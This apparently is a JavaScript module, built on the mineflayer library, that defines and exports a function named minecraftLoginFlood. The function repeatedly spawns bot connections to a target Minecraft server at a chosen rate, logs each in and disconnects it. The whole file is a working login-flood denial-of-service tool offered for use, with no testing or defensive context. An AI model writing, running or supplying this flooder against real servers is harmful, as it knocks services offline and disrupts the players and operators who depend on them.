const mineflayer = require('mineflayer');

function minecraftLoginFlood(target, rateLimit) {
    setInterval(() => {
        const bot = mineflayer.createBot({
            host: target,
            username: 'bot',
            password: 'password'
        });

        bot.on('login', () => {
            console.log('Bot logged in');
            bot.end();
        });

        bot.on('error', (err) => {
            console.error('Bot error: ' + err.message);
        });
    }, 1000 / rateLimit);
}

module.exports = minecraftLoginFlood;
